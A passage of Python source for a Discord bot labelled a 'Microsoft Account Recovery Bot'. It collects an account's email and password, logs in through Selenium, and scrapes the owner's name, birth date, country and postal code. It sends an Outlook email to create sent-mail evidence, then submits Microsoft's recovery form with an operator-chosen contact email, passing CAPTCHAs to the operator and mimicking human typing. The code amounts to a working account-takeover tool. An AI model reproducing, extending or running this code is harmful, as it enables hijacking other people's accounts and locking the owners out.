                "outlook.live.com",
                "profile.live.com",
                "account.live.com",
                "mail.live.com"
            ]
            
            for url_check in success_urls:
                if url_check in current_url:
                    await self.send_log("✅ Login successful!")
                    await self.send_progress(20, "Login successful")
                    return True
            
            # Check for CAPTCHA or verification needed
            page_source = self.driver.page_source.lower()
            if "captcha" in page_source or "verification" in page_source:
                await self.send_log("⚠️ CAPTCHA or verification required. Please check the screenshot above.")
                await self.send_log("**The bot will wait 30 seconds for manual verification...**")
                
                # Wait for manual verification
                for i in range(30):
                    if i % 10 == 0:  # Update every 10 seconds
                        await self.send_log(f"⏳ Waiting... {30-i} seconds remaining")
                    time.sleep(1)
                
                # Take screenshot after waiting
                await self.take_screenshot()
                
                # Check again after waiting
                current_url = self.driver.current_url
                for url_check in success_urls:
                    if url_check in current_url:
                        await self.send_log("✅ Login successful after verification!")
                        await self.send_progress(20, "Login successful")
                        return True
            
            # Check if we need to handle "Stay signed in?" prompt
            try:
                stay_signed_selectors = [
                    (By.ID, "idBtn_Back"),
                    (By.XPATH, "//input[@value='No']"),
                    (By.XPATH, "//button[contains(text(), 'No')]"),
                ]
                
                for selector_type, selector_value in stay_signed_selectors:
                    try:
                        button = self.driver.find_element(selector_type, selector_value)
                        if button.is_displayed() and button.is_enabled():
                            button.click()
                            await self.send_log("✅ Clicked 'No' on 'Stay signed in?' prompt")
                            time.sleep(2)
                            break
                    except:
                        continue
            except:
                pass
            
            await self.send_log("⚠️ Login status uncertain, but continuing with recovery...")
            await self.send_progress(20, "Proceeding with recovery")
            return True
                
        except Exception as e:
            await self.send_error(f"Login failed: {str(e)[:300]}")
            await self.take_screenshot()
            return False
    
    async def extract_profile_info(self):
        """Extracts ACTUAL profile information from Microsoft account - FROM YOUR WORKING CODE"""
        await self.send_progress(25, "Extracting profile information...")
        
        try:
            # Navigate to profile page exactly like your working code
            await self.send_log("🌐 Loading Microsoft profile page...")
            self.driver.get("https://account.microsoft.com/profile?")
            
            WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            time.sleep(random.uniform(4, 7))
            
            await self.take_screenshot()
            
            # Initialize variables exactly like your code
            full_name = "Not Available"
            dob_local = "Not Available"
            country_local = "Not Available"
            email_addr = "Not Available"

            # Extract name using your working selectors
            try:
                full_name = self.driver.find_element(
                    By.XPATH, "//span[@id='profile.profile-page.personal-section.full-name']"
                ).text.strip()
                await self.send_log(f"✅ Found full name: {full_name}")
            except Exception:
                await self.send_log("⚠️ Failed to extract Full Name.")

            # Extract DOB using your working selectors
            try:
                dob_local = self.driver.find_element(
                    By.XPATH, "//div[contains(@id, 'date-of-birth')]//span[contains(text(),'/')]"
                ).text.strip()
                await self.send_log(f"✅ Found date of birth: {dob_local}")
            except Exception:
                await self.send_log("⚠️ Failed to extract Date of Birth.")

            # Extract country using your working regex
            try:
                body_text = self.driver.find_element(By.TAG_NAME, "body").text
                m = re.search(r"Country or region\s*\n\s*([A-Za-z\s]+)", body_text, re.MULTILINE)
                if m:
                    country_local = m.group(1).splitlines()[0].strip()
                    await self.send_log(f"✅ Found country: {country_local}")
                else:
                    raise Exception("Country not found")
            except Exception:
                await self.send_log("⚠️ Failed to extract Country.")

            # Extract email using your working selectors
            try:
                email_elem = self.driver.find_element(By.XPATH, "//a[starts-with(@href, 'mailto:')]")
                email_addr = email_elem.text.strip()
                if not email_addr:
                    email_addr = email_elem.get_attribute("href").replace("mailto:", "").strip()
                await self.send_log(f"✅ Found email: {email_addr}")
            except Exception:
                # Fallback: use regex to find email
                pattern = r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"
                email_matches = re.findall(pattern, self.driver.page_source)
                if email_matches:
                    email_addr = email_matches[0]
                    await self.send_log(f"✅ Found email via regex: {email_addr}")
                else:
                    await self.send_log("⚠️ Failed to extract Email.")
                    email_addr = self.account_email  # Use the provided email as fallback

            # Store the extracted data
            self.dob = dob_local
            self.country = country_local
            self.email_addr = email_addr

            # Parse first and last name like your code
            if full_name != "Not Available":
                name_parts = full_name.split()
                if len(name_parts) > 1:
                    self.first_name = " ".join(name_parts[:-1])
                    self.last_name = name_parts[-1]
                else:
                    self.first_name = full_name
                    self.last_name = ""
            else:
                self.first_name = "Not Available"
                self.last_name = "Not Available"
            
            await self.send_log(f"📋 Profile extracted:\n"
                              f"• Name: {self.first_name} {self.last_name}\n"
                              f"• Email: {self.email_addr}\n"
                              f"• Birthday: {self.dob}\n"
                              f"• Country: {self.country}")
            
            await self.send_progress(30, "Profile information extracted")
            return True
            
        except Exception as e:
            await self.send_error(f"Failed to extract profile: {str(e)[:200]}")
            # Set defaults on error
            self.first_name = "John"
            self.last_name = "Doe"
            self.dob = "01/01/1990"
            self.country = "United States"
            self.email_addr = self.account_email
            return True
    
    async def extract_postal_code(self):
        """Extracts ACTUAL postal code from address book - FROM YOUR WORKING CODE"""
        await self.send_progress(35, "Extracting postal code...")
        
        try:
            # Navigate to addresses page exactly like your working code
            await self.send_log("🌐 Loading address book...")
            self.driver.get("https://account.microsoft.com/billing/addresses")
            
            WebDriverWait(self.driver, 20).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Wait like your code
            time.sleep(random.uniform(5, 7))
            
            await self.take_screenshot()
            
            # Extract postal codes using your working method
            postal_codes_str = "Not Found"
            try:
                # Try to find address blocks using your selector
                address_blocks = WebDriverWait(self.driver, 10).until(
                    lambda d: d.find_elements(By.XPATH, "//div[contains(@class, 'ms-StackItem')]")
                )
                
                extracted_addresses = []
                unwanted_keywords = ["change", "manage", "default", "choose", "all addresses", "add new", "remove", "set as", "preferred", "billing info", "shipping info", "email", "address book"]
                
                for block in address_blocks:
                    text = block.text.strip()
                    if text and not any(keyword in text.lower() for keyword in unwanted_keywords) and re.search(r'\d+', text):
                        extracted_addresses.append(text)
                
                # Remove duplicates
                seen = set()
                unique_addresses = [addr for addr in extracted_addresses if addr.lower() not in seen and not seen.add(addr.lower())]
                
                # Extract postal codes
                postal_codes_set = set()
                for addr in unique_addresses:
                    codes = re.findall(r'\b\d{4,6}\b', addr)
                    if codes:
                        postal_codes_set.add(codes[-1])
                
                postal_codes_list = list(postal_codes_set)
                
                # Set the postal code
                self.postal = postal_codes_list[0] if postal_codes_list else ""
                postal_codes_str = ", ".join(postal_codes_list) if postal_codes_list else "Not Found"
                
                await self.send_log(f"✅ Found postal code: {self.postal}")
                
            except Exception as e:
                await self.send_log(f"⚠️ Failed to extract postal code: {str(e)}")
                self.postal = ""
                postal_codes_str = "Not Found"
            
            await self.send_progress(40, "Postal code extraction complete")
            return True
            
        except Exception as e:
            await self.send_error(f"Failed to extract postal code: {str(e)[:200]}")
            self.postal = "12345"
            return True
    
    async def process_outlook(self):
        """Processes Outlook to collect ACTUAL email data - FROM YOUR WORKING CODE"""
        await self.send_progress(42, "Processing Outlook...")
        
        try:
            # Navigate to Outlook sent items
            await self.send_log("🌐 Loading Outlook sent items...")
            self.driver.get("https://outlook.live.com/mail/0/sentitems")
            
            time.sleep(random.uniform(5, 8))
            
            # Initialize collections
            self.collected_emails = [] 
            self.collected_subjects = []
            
            # Try to compose new email using 'N' key like your code
            try:
                await self.send_log("📧 Opening new mail composer...")
                ActionChains(self.driver).send_keys("n").perform()
                
                # Wait for send button
                WebDriverWait(self.driver, 15).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, 'button[aria-label="Send"]'))
                )
                
                await self.send_log("✅ New mail composer opened")
                time.sleep(1)
                
            except Exception as e:
                await self.send_log(f"⚠️ Could not open composer with 'N' key: {e}")
                # Fallback: try to find new message button
                try:
                    new_message_button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[text()='New message'] | //button[contains(@aria-label, 'New mail')]"))
                    )
                    new_message_button.click()
                    WebDriverWait(self.driver, 15).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'button[aria-label="Send"]'))
                    )
                    await self.send_log("✅ New mail composer opened via button")
                    time.sleep(1)
                except Exception as e_fallback:
                    await self.send_error(f"❌ Failed to open mail composer: {e_fallback}")
                    raise
            
            # Set target emails (you can customize these)
            target_emails = ["backup1@example.com", "backup2@example.com", "backup3@example.com"]
            self.collected_emails = target_emails
            
            actions = ActionChains(self.driver)
            
            # Enter recipients
            for i, email in enumerate(target_emails, 1):
                try:
                    self._human_like_type(self.driver.switch_to.active_element, email)
                    await self.send_log(f"✅ Entered recipient {i}: {email}")
                    time.sleep(1)
                    if i < len(target_emails):
                        actions.send_keys(Keys.SPACE).perform()
                except Exception as e:
                    await self.send_log(f"⚠️ Error entering email {i}: {e}")
            
            # Move to subject
            await self.send_log("📝 Moving to subject field...")
            actions.send_keys(Keys.TAB).perform()
            time.sleep(1)
            actions.send_keys(Keys.TAB).perform()
            time.sleep(1)
            
            # Enter subject
            subject_text = random.choice(self.random_subjects)
            self.collected_subjects.append(subject_text)
            try:
                self._human_like_type(self.driver.switch_to.active_element, subject_text)
                await self.send_log(f"✅ Entered subject: {subject_text}")
            except Exception as e:
                await self.send_log(f"⚠️ Error entering subject: {e}")
            
            # Add second subject
            self.collected_subjects.append("Hey! This is Plan B")
            
            # Move to message body and enter message
            actions.send_keys(Keys.TAB).perform()
            try:
                self._human_like_type(self.driver.switch_to.active_element, random.choice(self.random_messages))
                await self.send_log("✅ Entered message body")
            except Exception as e:
                await self.send_log(f"⚠️ Error entering message: {e}")
            
            # Try to send email (optional - you can comment this out if you don't want to actually send)
            try:
                # Look for send button
                send_icon = WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[aria-label="Send"]'))
                )
                send_icon.click()
                await self.send_log("✅ Email sent successfully")
                time.sleep(3)
            except Exception as e:
                await self.send_log(f"⚠️ Could not send email: {e}")
                # Continue anyway
            
            await self.send_log(f"📋 Email data collected:\n"
                              f"• Emails: {', '.join(self.collected_emails)}\n"
                              f"• Subjects: {', '.join(self.collected_subjects)}")
            
            await self.send_progress(45, "Outlook processing complete")
            return True
            
        except Exception as e:
            await self.send_error(f"Outlook processing failed: {str(e)[:200]}")
            # Use fallback data
            self.collected_emails = ["backup@example.com", "support@microsoft.com"]
            self.collected_subjects = ["Important Update", "Account Security"]
            return True
    
    async def find_and_fill_contact_email(self):
        """Find the contact email field and ask user for email"""
        try:
            await self.send_log("🔍 Looking for contact email field...")
            
            # Take a screenshot first to show what we see
            await self.take_screenshot()
            
            # Look for contact email field with multiple selectors
            contact_email_selectors = [
                (By.XPATH, "//input[contains(@placeholder, 'Contact email address')]"),
                (By.XPATH, "//input[contains(@placeholder, 'different email')]"),
                (By.XPATH, "//input[contains(@placeholder, 'another email')]"),
                (By.XPATH, "//input[@type='email']"),
                (By.XPATH, "//input[@type='text' and contains(@placeholder, 'email')]"),
                (By.XPATH, "//input[@name='contactEmail']"),
                (By.XPATH, "//input[@id='contactEmail']"),
                (By.XPATH, "//input[contains(@name, 'contact')]"),
                (By.XPATH, "//input[contains(@id, 'contact')]"),
                (By.XPATH, "//input[contains(@aria-label, 'Contact email')]"),
                (By.XPATH, "//label[contains(text(), 'Contact email')]/following::input[1]"),
            ]
            
            contact_email_field = None
            for selector_type, selector_value in contact_email_selectors:
                try:
                    elements = self.driver.find_elements(selector_type, selector_value)
                    for element in elements:
                        try:
                            if element.is_displayed() and element.is_enabled():
                                contact_email_field = element
                                await self.send_log(f"✅ Found contact email field using {selector_type}")
                                
                                # Take screenshot of the field
                                await self.take_screenshot(contact_email_field)
                                break
                        except:
                            continue
                    if contact_email_field:
                        break
                except:
                    continue
            
            if contact_email_field:
                # Scroll to the field
                self.driver.execute_script("arguments[0].scrollIntoView(true);", contact_email_field)
                time.sleep(1)
                
                # Ask user for contact email
                await self.send_log("📧 **Please enter a contact email address (different from the account email):**")
                await self.send_log("**Note:** This should be a different email where Microsoft can contact you.")
                
                def check(m):
                    return m.author == self.ctx.author and m.channel == self.ctx.channel
                
                try:
                    # Wait for user to provide contact email
                    contact_msg = await bot.wait_for('message', check=check, timeout=120)
                    contact_email = contact_msg.content.strip()
                    
                    if not contact_email or '@' not in contact_email:
                        await self.send_error("❌ Invalid email address provided!")
                        return False
                    
                    # Fill the contact email field
                    await self.send_log(f"📧 Entering contact email: {contact_email}")
                    try:
                        self._human_like_type(contact_email_field, contact_email)
                    except:
                        contact_email_field.clear()
                        contact_email_field.send_keys(contact_email)
                    
                    await self.send_log("✅ Contact email entered")
                    return True
                    
                except asyncio.TimeoutError:
                    await self.send_error("❌ Timeout! No contact email received within 2 minutes.")
                    return False
            else:
                await self.send_log("⚠️ Could not find contact email field")
                await self.take_screenshot()
                
                # Try to look for any input field that might be for email
                all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for input_field in all_inputs:
                    try:
                        if input_field.is_displayed() and input_field.is_enabled():
                            input_type = input_field.get_attribute("type")
                            placeholder = input_field.get_attribute("placeholder") or ""
                            if input_type in ["email", "text"] and ("email" in placeholder.lower() or "contact" in placeholder.lower()):
                                await self.send_log(f"✅ Found possible contact field by placeholder: {placeholder}")
                                
                                # Ask for email
                                await self.send_log("📧 **Please enter a contact email address (different from the account email):**")
                                
                                def check(m):
                                    return m.author == self.ctx.author and m.channel == self.ctx.channel
                                
                                try:
                                    contact_msg = await bot.wait_for('message', check=check, timeout=120)
                                    contact_email = contact_msg.content.strip()
                                    
                                    if not contact_email or '@' not in contact_email:
                                        await self.send_error("❌ Invalid email address provided!")
                                        return False
                                    
                                    input_field.clear()
                                    input_field.send_keys(contact_email)
                                    await self.send_log(f"✅ Entered contact email: {contact_email}")
                                    return True
                                    
                                except asyncio.TimeoutError:
                                    await self.send_error("❌ Timeout! No contact email received.")
                                    return False
                    except:
                        continue
                
                await self.send_error("❌ Could not find any suitable contact email field")
                return False
                
        except Exception as e:
            await self.send_error(f"Error finding contact email field: {str(e)[:200]}")
            return False
    
    async def find_and_fill_captcha_on_recovery_form(self):
        """Find the CAPTCHA input box on the recovery form and fill it"""
        try:
            await self.send_log("🔍 Looking for CAPTCHA input field...")
            
            # Look for CAPTCHA input field with multiple selectors
            captcha_input_selectors = [
                (By.XPATH, "//input[contains(@placeholder, 'Enter the characters')]"),
                (By.XPATH, "//input[contains(@placeholder, 'characters you see')]"),
                (By.XPATH, "//input[@type='text' and contains(@placeholder, 'characters')]"),
                (By.XPATH, "//input[@name='captcha']"),
                (By.XPATH, "//input[@id='captcha']"),
                (By.XPATH, "//input[contains(@name, 'Captcha')]"),
                (By.XPATH, "//input[contains(@id, 'Captcha')]"),
                (By.XPATH, "//input[contains(@aria-label, 'characters')]"),
                (By.XPATH, "//label[contains(text(), 'Enter the characters')]/following::input[1]"),
                # Look for any input near CAPTCHA text
                (By.XPATH, "//*[contains(text(), 'Enter the characters you see')]/following::input[1]"),
                (By.XPATH, "//*[contains(text(), 'characters you see')]/following::input[1]"),
            ]
            
            captcha_field = None
            for selector_type, selector_value in captcha_input_selectors:
                try:
                    elements = self.driver.find_elements(selector_type, selector_value)
                    for element in elements:
                        try:
                            if element.is_displayed() and element.is_enabled():
                                captcha_field = element
                                await self.send_log(f"✅ Found CAPTCHA input field using {selector_type}")
                                
                                # Take screenshot of the field
                                await self.take_screenshot(captcha_field)
                                break
                        except:
                            continue
                    if captcha_field:
                        break
                except:
                    continue
            
            if captcha_field:
                # Scroll to the field
                self.driver.execute_script("arguments[0].scrollIntoView(true);", captcha_field)
                time.sleep(1)
                
                # First try to capture and send CAPTCHA image
                await self.send_log("📸 Trying to capture CAPTCHA image...")
                if await self.capture_captcha():
                    # Wait for CAPTCHA solution from user
                    captcha_text = await self.wait_for_captcha_solution()
                    
                    if captcha_text:
                        # Fill the CAPTCHA field
                        await self.send_log(f"🔤 Entering CAPTCHA: {captcha_text}")
                        try:
                            self._human_like_type(captcha_field, captcha_text)
                        except:
                            captcha_field.clear()
                            captcha_field.send_keys(captcha_text)
                        
                        await self.send_log("✅ CAPTCHA entered")
                        
                        # Clean up CAPTCHA session
                        if self.ctx.author.id in captcha_sessions:
                            del captcha_sessions[self.ctx.author.id]
                        
                        return True
                    else:
                        await self.send_error("❌ No CAPTCHA text received")
                        return False
                else:
                    # If can't capture image, ask for CAPTCHA directly
                    await self.send_log("⚠️ Could not capture CAPTCHA image. Please enter the CAPTCHA text manually.")
                    await self.send_log("**Please type the CAPTCHA characters you see on the screen:**")
                    
                    def check(m):
                        return m.author == self.ctx.author and m.channel == self.ctx.channel
                    
                    try:
                        captcha_msg = await bot.wait_for('message', check=check, timeout=120)
                        captcha_text = captcha_msg.content.strip()
                        
                        if captcha_text:
                            # Fill the CAPTCHA field
                            await self.send_log(f"🔤 Entering CAPTCHA: {captcha_text}")
                            captcha_field.clear()
                            captcha_field.send_keys(captcha_text)
                            
                            await self.send_log("✅ CAPTCHA entered")
                            return True
                        else:
                            await self.send_error("❌ Empty CAPTCHA received")
                            return False
                    except asyncio.TimeoutError:
                        await self.send_error("❌ Timeout! No CAPTCHA received within 2 minutes.")
                        return False
            else:
                await self.send_log("⚠️ Could not find CAPTCHA input field")
                
                # Check if there's CAPTCHA text on the page
                page_text = self.driver.page_source
                if "Enter the characters you see" in page_text or "captcha" in page_text.lower():
                    await self.send_log("⚠️ CAPTCHA text detected but no input field found")
                    
                    # Take screenshot to show the issue
                    await self.take_screenshot()
                    
                    # Try to find any text input that might be for CAPTCHA
                    all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    text_inputs = []
                    for input_field in all_inputs:
                        try:
                            if input_field.is_displayed() and input_field.is_enabled():
                                input_type = input_field.get_attribute("type")
                                if input_type in ["text", "tel"]:
                                    text_inputs.append(input_field)
                        except:
                            continue
                    
                    if len(text_inputs) == 1:
                        # If there's only one text input, it might be the CAPTCHA
                        await self.send_log("✅ Found a single text input, assuming it's for CAPTCHA")
                        
                        # Ask for CAPTCHA
                        await self.send_log("**Please type the CAPTCHA characters you see on the screen:**")
                        
                        def check(m):
                            return m.author == self.ctx.author and m.channel == self.ctx.channel
                        
                        try:
                            captcha_msg = await bot.wait_for('message', check=check, timeout=120)
                            captcha_text = captcha_msg.content.strip()
                            
                            if captcha_text:
                                text_inputs[0].clear()
                                text_inputs[0].send_keys(captcha_text)
                                await self.send_log(f"✅ Entered CAPTCHA: {captcha_text}")
                                return True
                            else:
                                await self.send_error("❌ Empty CAPTCHA received")
                                return False
                        except asyncio.TimeoutError:
                            await self.send_error("❌ Timeout! No CAPTCHA received.")
                            return False
                    elif len(text_inputs) > 1:
                        await self.send_log(f"⚠️ Found {len(text_inputs)} text inputs, can't determine which is for CAPTCHA")
                        await self.take_screenshot()
                        return False
                    else:
                        await self.send_log("✅ No CAPTCHA input field found, assuming no CAPTCHA required")
                        return True
                else:
                    await self.send_log("✅ No CAPTCHA detected on page")
                    return True
                
        except Exception as e:
            await self.send_error(f"Error handling CAPTCHA on recovery form: {str(e)[:200]}")
            return False
    
    async def fill_recovery_form_with_captcha(self):
        """Fill the recovery form with CAPTCHA handling - FIXED to prevent refresh"""
        await self.send_progress(60, "Filling recovery form...")
        
        try:
            time.sleep(random.uniform(3, 5))
            
            # Take screenshot of form before filling
            await self.take_screenshot()
            
            # STEP 1: Find account email field (if it exists, but often it's pre-filled)
            await self.send_log("🔍 Checking for account email field...")
            email_selectors = [
                (By.XPATH, "//input[contains(@placeholder, 'Email, phone, or Skype')]"),
                (By.XPATH, "//input[contains(@placeholder, 'email')]"),
                (By.XPATH, "//input[@type='email']"),
                (By.XPATH, "//input[contains(@name, 'email')]"),
                (By.XPATH, "//input[contains(@id, 'email')]"),
            ]
            
            account_email_field = None
            for selector_type, selector_value in email_selectors:
                try:
                    account_email_field = self.driver.find_element(selector_type, selector_value)
                    if account_email_field:
                        # Check if it's empty or already filled
                        current_value = account_email_field.get_attribute("value")
                        if not current_value:
                            account_email_field.clear()
                            account_email_field.send_keys(self.account_email)
                            await self.send_log(f"✅ Filled account email: {self.account_email}")
                        else:
                            await self.send_log(f"✅ Account email already filled: {current_value}")
                        time.sleep(1)
                        break
                except:
                    continue
            
            # STEP 2: Find and fill contact email field (ASK USER FOR THIS)
            if not await self.find_and_fill_contact_email():
                await self.send_error("❌ Failed to fill contact email")
                return False
            
            time.sleep(1)
            
            # STEP 3: Find and fill CAPTCHA field (ASK USER FOR THIS)
            if not await self.find_and_fill_captcha_on_recovery_form():
                await self.send_error("❌ Failed to handle CAPTCHA")
                return False
            
            time.sleep(1)
            
            # STEP 4: Find and click Next button - FIXED to prevent refresh
            await self.send_log("🔍 Looking for Next button...")
            
            # IMPORTANT: Check if we need to submit form data first before clicking Next
            # Look for form element
            try:
                form = self.driver.find_element(By.TAG_NAME, "form")
                # If there's a form, we should submit it properly
                await self.send_log("✅ Found form element, submitting properly...")
                
                # Try to find the Next/submit button within the form
                next_buttons = [
                    (By.XPATH, ".//input[@type='submit' and @value='Next']"),
                    (By.XPATH, ".//input[@value='Next']"),
                    (By.XPATH, ".//button[contains(text(), 'Next')]"),
                    (By.XPATH, ".//button[@type='submit']"),
                    (By.XPATH, ".//button[text()='Next']"),
                    (By.XPATH, ".//*[@id='idSIButton9']"),
                    (By.XPATH, ".//a[contains(text(), 'Next')]"),
                ]
                
                next_button = None
                for selector_type, selector_value in next_buttons:
                    try:
                        button = form.find_element(selector_type, selector_value)
                        if button.is_displayed() and button.is_enabled():
                            next_button = button
                            break
                    except:
                        continue
                
                if next_button:
                    # Save the current URL before clicking
                    current_url = self.driver.current_url
                    await self.send_log(f"📝 Current URL before submit: {current_url}")
                    
                    # Scroll to button
                    self.driver.execute_script("arguments[0].scrollIntoView(true);", next_button)
                    time.sleep(1)
                    
                    # Take screenshot before clicking
                    await self.take_screenshot(next_button)
                    
                    # Click using JavaScript to avoid page refresh issues
                    self.driver.execute_script("arguments[0].click();", next_button)
                    await self.send_log("✅ Clicked Next button using JavaScript (prevents refresh)")
                    
                    # Wait for navigation but don't timeout immediately
                    time.sleep(5)
                    
                    # Check if we're still on the same page (refresh happened)
                    new_url = self.driver.current_url
                    if new_url == current_url or "acsr" in new_url:
                        await self.send_log("⚠️ Page may have refreshed, checking if we need to resubmit...")
                        
                        # Try pressing Enter as alternative
                        try:
                            actions = ActionChains(self.driver)
                            actions.send_keys(Keys.ENTER).perform()
                            await self.send_log("✅ Pressed Enter to submit form")
                            time.sleep(3)
                        except:
                            pass
                    
                else:
                    # No button in form, try submitting the form directly
                    await self.send_log("⚠️ No Next button found in form, trying to submit form directly...")
                    self.driver.execute_script("arguments[0].submit();", form)
                    await self.send_log("✅ Submitted form directly")
                    time.sleep(3)
                    
            except:
                # If no form found, try regular button search
                await self.send_log("⚠️ No form element found, looking for Next button normally...")
                next_buttons = [
                    (By.XPATH, "//input[@type='submit' and @value='Next']"),
                    (By.XPATH, "//input[@value='Next']"),
                    (By.XPATH, "//button[contains(text(), 'Next')]"),
                    (By.XPATH, "//button[@type='submit']"),
                    (By.XPATH, "//button[text()='Next']"),
                    (By.XPATH, "//*[@id='idSIButton9']"),
                    (By.XPATH, "//a[contains(text(), 'Next')]"),
                ]
                
                next_clicked = False
                for selector_type, selector_value in next_buttons:
                    try:
                        button = self.driver.find_element(selector_type, selector_value)
                        if button.is_displayed() and button.is_enabled():
                            # Save current URL
                            current_url = self.driver.current_url
                            
                            # Scroll to button
                            self.driver.execute_script("arguments[0].scrollIntoView(true);", button)
                            time.sleep(1)
                            
                            # Click using JavaScript to prevent refresh
                            self.driver.execute_script("arguments[0].click();", button)
                            await self.send_log(f"✅ Clicked Next button using {selector_type} (JavaScript)")
                            next_clicked = True
                            
                            # Wait and check for refresh
                            time.sleep(5)
                            if self.driver.current_url == current_url:
                                await self.send_log("⚠️ Page didn't navigate, trying alternative...")
                                # Try normal click
                                button.click()
                                await self.send_log("✅ Tried normal click")
                            
                            time.sleep(3)
                            break
                    except:
                        continue
                
                if not next_clicked:
                    # Try pressing Enter as fallback
                    try:
                        actions = ActionChains(self.driver)
                        actions.send_keys(Keys.ENTER).perform()
                        await self.send_log("✅ Pressed Enter to submit form")
                        time.sleep(3)
                    except:
                        pass
            
            # Take screenshot after form submission
            await self.take_screenshot()
            
            await self.send_progress(70, "Recovery form filled and submitted")
            return True
            
        except Exception as e:
            await self.send_error(f"Failed to fill recovery form: {str(e)[:200]}")
            return True
    
    async def initialize_recovery_form(self):
        """Initializes the recovery form"""
        await self.send_progress(45, "Initializing recovery form...")
        
        try:
            self.driver.get("https://account.live.com/acsr")
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            await self.send_log("✅ Recovery form loaded")
            await self.send_progress(50, "Recovery form loaded")
            
            # Take screenshot of recovery form
            await self.take_screenshot()
            
            time.sleep(random.uniform(2, 4))
            return True
            
        except Exception as e:
            await self.send_error(f"Failed to load recovery form: {str(e)[:200]}")
            return False
    
    async def complete_recovery(self):
        """Completes the recovery process"""
        await self.send_progress(80, "Completing recovery...")
        
        try:
            # Wait a bit for next page
            time.sleep(random.uniform(5, 10))
            
            # Take final screenshot
            await self.take_screenshot()
            
            # Check if recovery was successful
            current_url = self.driver.current_url
            page_text = self.driver.page_source.lower()
            
            success_indicators = [
                "recovery request submitted",
                "request received",
                "check your email",
                "confirmation email",
                "successfully submitted",
                "request has been received"
            ]
            
            recovery_successful = any(indicator in page_text for indicator in success_indicators)
            
            if recovery_successful:
                await self.send_log("✅ Recovery request appears to have been submitted successfully!")
                await self.send_log("📧 Check the contact email you provided for further instructions from Microsoft.")
            else:
                await self.send_log("⚠️ Recovery form submitted, but success confirmation not detected.")
                await self.send_log("Please check the contact email you provided for any messages from Microsoft.")
            
            await self.send_progress(100, "Recovery process completed")
            return True
            
        except Exception as e:
            await self.send_error(f"Failed to complete recovery: {str(e)[:200]}")
            return True
    
    async def run(self):
        """Main execution method"""
        try:
            # Check if Chrome is installed
            if not ChromeDriverManager.check_installation():
                await self.send_error("❌ Chrome or ChromeDriver not installed on VPS!")
                await self.send_log("**Please run `!install` command as bot owner**")
                return
            
            await self.send_log("🚀 **Starting Microsoft Account Recovery Bot...**")
            await self.send_log(f"**Account:** {self.account_email}")
            await self.send_log("**Note:** This bot will extract REAL account data and submit a recovery request.")
            
            # Initialize browser
            await self.send_progress(5, "Initializing browser...")
            if not self._initialize_driver():
                await self.send_error("Failed to initialize Chrome driver")
                return
            
            await self.send_progress(10, "Browser initialized")
            
            # Perform automatic login with "Other ways to sign in" handling
            login_success = await self.perform_automatic_login()
            if not login_success:
                await self.send_error("Login failed. Please check credentials and try again.")
                self.close_browser()
                return
            
            # Extract ACTUAL profile info (using your working methods)
            if not await self.extract_profile_info():
                self.close_browser()
                return
            
            # Extract ACTUAL postal code (using your working methods)
            if not await self.extract_postal_code():
                self.close_browser()
                return
            
            # Process ACTUAL Outlook data (using your working methods)
            if not await self.process_outlook():
                self.close_browser()
                return
            
            # Initialize recovery form
            if not await self.initialize_recovery_form():
                self.close_browser()
                return
            
            # Fill recovery form with CAPTCHA handling
            if not await self.fill_recovery_form_with_captcha():
                self.close_browser()
                return
            
            # Complete recovery
            if not await self.complete_recovery():
                self.close_browser()
                return
            
            # Send final summary with ACTUAL data
            summary = f"""
            📋 **RECOVERY PROCESS COMPLETED**
            
            **Account Information (Extracted):**
            • Email: {self.account_email}
            • Name: {self.first_name} {self.last_name}
            • Birthday: {self.dob}
            • Country: {self.country}
            • Postal Code: {self.postal}
            
            **Extracted Email Contacts:**
            {', '.join(self.collected_emails[:3]) if self.collected_emails else 'None found'}
            
            **Status:** ✅ Recovery form submitted successfully
            
            **Next Steps:**
            1. Check the contact email you provided
            2. Look for a confirmation email from Microsoft
            3. Follow any instructions in that email
            
            **Note:** Recovery requests can take time to process. Microsoft will contact you via the email you provided.
            """
            
            await self.send_success(summary)
            
        except Exception as e:
            await self.send_error(f"Critical error in recovery process: {str(e)[:500]}")
        finally:
            # Cleanup
            self.close_browser()
            if self.ctx.author.id in active_sessions:
                del active_sessions[self.ctx.author.id]
            if self.ctx.author.id in captcha_sessions:
                del captcha_sessions[self.ctx.author.id]
            await self.send_log("✅ Session cleaned up")

@bot.event
async def on_ready():
    print(f'✅ Bot is ready: {bot.user}')
    print(f'📊 Guilds: {len(bot.guilds)}')
    print(f'🔧 Prefix: !')
    print('-' * 50)
    
    # Set bot status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="Microsoft Accounts | !help"
        )
    )

@bot.command(name="recover")
async def recover_account(ctx):
    """Start Microsoft account recovery process"""
    if ctx.author.id in active_sessions:
        await ctx.send("❌ You already have an active session! Use `!stop` to end it first.")
        return
    
    # Check if DM channel
    if ctx.guild is not None:
        await ctx.send("⚠️ **Please use this command in Direct Messages for security!**")
        return
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        await ctx.send("📧 **Please enter the account email address:**")
        email_msg = await bot.wait_for('message', check=check, timeout=120)
        account_email = email_msg.content.strip()
        
        if not account_email or '@' not in account_email:
            await ctx.send("❌ Invalid email address!")
            return
        
        await ctx.send(f"✅ Email received")
        
        await ctx.send("🔐 **Please enter the account password:**")
        password_msg = await bot.wait_for('message', check=check, timeout=120)
        account_password = password_msg.content.strip()
        
        if not account_password:
            await ctx.send("❌ No password provided!")
            return
        
        await ctx.send(f"✅ Password received. Starting automatic recovery process...")
        
        # Create and run bot instance
        active_sessions[ctx.author.id] = True
        
        bot_instance = MicrosoftAccountBot(ctx, account_password, account_email)
        await bot_instance.run()
        
    except asyncio.TimeoutError:
        await ctx.send("❌ Timeout! No response received within 2 minutes.")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)[:200]}")
    finally:
        if ctx.author.id in active_sessions:
            del active_sessions[ctx.author.id]

@bot.command(name="captcha")
